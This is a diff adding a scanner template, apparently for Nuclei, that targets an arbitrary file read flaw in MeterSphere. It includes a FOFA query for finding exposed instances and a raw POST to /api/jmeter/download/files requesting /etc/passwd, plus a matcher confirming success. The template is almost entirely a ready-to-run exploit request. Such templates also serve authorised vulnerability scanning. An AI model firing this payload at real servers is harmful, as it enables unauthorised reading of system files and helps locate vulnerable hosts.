@@ -1,0 +1,22 @@
+id: MeterSphere-fileread
+info:
+  name: MeterSphere-fileread
+  author: sb    
+  severity: critical
+  description: 
+  metadata:
+    fofa-query: app="FIT2CLOUD-MeterSphere"
+http:
+  - raw:
+    - |      
+      POST /api/jmeter/download/files HTTP/1.1 
+      Content-Type: application/json
+      Accept-Encoding: gzip
+
+      {"reportId":"pass","bodyFiles":[{"id":"aaa","name":"/etc/passwd"}]}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"/etc/passwd") && status_code == 200'
